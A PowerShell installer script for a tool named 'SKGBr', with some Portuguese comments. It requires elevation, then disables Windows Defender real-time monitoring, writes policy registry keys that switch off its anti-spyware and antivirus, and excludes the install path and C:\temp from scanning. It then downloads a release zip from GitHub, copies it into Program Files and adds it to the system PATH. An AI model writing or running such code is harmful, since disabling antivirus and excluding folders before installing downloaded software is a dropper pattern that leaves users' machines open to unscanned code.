#Configure Variables
$InstallPath = "C:\Program Files\"

#These ones probably should not change
$GitUrl = 'https://github.com/brunomlima/SKGBr/releases/latest/'
$GitZipName = "SKGBr-v1.0.0.zip" 
$GitZipFolder = "SKGBr-v1.0.0"
$InstallPathPrg = $InstallPath + $GitZipFolder
$ErrorActionPreference = "Stop"
$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
# Detect Elevation:
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$UserPrincipal = New-Object System.Security.Principal.WindowsPrincipal($CurrentUser)
$AdminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
$IsAdmin = $UserPrincipal.IsInRole($AdminRole)
if ($IsAdmin) {
    Write-Host "Script is running elevated." -ForegroundColor Green
}
else {
    throw "Script is not running elevated, which is required. Restart the script from an elevated prompt."
}

#Desabilita o windows defender
Set-MpPreference -DisableRealtimeMonitoring $true -Force
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -PropertyType DWord -Force
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiVirus' -Value 1 -PropertyType DWord -Force
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'ServiceKeepAlive' -Value 0 -PropertyType DWord -Force

#Adiciona o diretório na lista de exclusão do windows defender
Add-MpPreference -ExclusionPath $InstallPathPrg
Add-MpPreference -ExclusionPath "C:\temp"
#Randomize Querystring to ensure our request isnt served from a cache
$GitUrl += "?random=" + $(Get-Random -Minimum 10000 -Maximum 99999)
# Get Upstream URL
Write-Host "Requesting URL for latest version of SKGBr" -ForegroundColor Green
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$request = [System.Net.WebRequest]::Create($GitUrl)
$request.AllowAutoRedirect = $false
$request.Timeout = 5 * 1000
$request.headers.Add("Pragma", "no-cache")
$request.headers.Add("Cache-Control", "no-cache")
$request.UserAgent = $UserAgent
$response = $request.GetResponse()
if ($null -eq $response -or $null -eq $([String]$response.GetResponseHeader("Location"))) { throw "Unable to download SKGBr Archive. Sometimes you can get throttled, so just try again later." }
$SKGBrURL = $([String]$response.GetResponseHeader("Location")).Replace('tag', 'download') + "/" + $GitZipName
# #Also randomize this one...
$SKGBrURL += "?random=" + $(Get-Random -Minimum 10000 -Maximum 99999)
Write-Host "Using URL" -ForegroundColor Green
Write-Host $SKGBrURL -ForegroundColor Green
# #Download and extract archive
Write-Host "Downloading Archive" -ForegroundColor Green
Invoke-WebRequest -Uri $SKGBrURL -OutFile $GitZipName -ErrorAction Stop -TimeoutSec 5 -Headers @{"Pragma" = "no-cache"; "Cache-Control" = "no-cache"; } -UserAgent $UserAgent
Expand-Archive -LiteralPath $GitZipName 

Copy-Item -Path $GitZipFolder -Destination $InstallPath -Recurse

Write-Host "Download Complete, now expanding and copying to destination" -ForegroundColor Green -ErrorAction Stop

Remove-Item -Path $GitZipFolder -Force -Recurse -ErrorAction SilentlyContinue

If (!(Test-Path $InstallPathPrg)) {
    New-Item -Path $InstallPathPrg -ItemType "directory" -ErrorAction Stop | Out-Null
}
#Cleanup zip file if we downloaded it
if ($SKGBrURL.Length -gt 0) { Remove-Item -Path $GitZipName -Force -ErrorAction SilentlyContinue }
#Add to path if it isnt already there
$existingPath = (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).path
if ($existingPath -notmatch $InstallPathPrg.Replace("\", "\\")) {
    Write-Host "Adding SKGBr Directory to path" -ForegroundColor Green
    $newpath = "$existingPath;$InstallPathPrg"
    Set-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH -Value $newPath -ErrorAction Stop
}
#Set Shell to powershell
Write-Host "Installation completed successfully" -ForegroundColor Green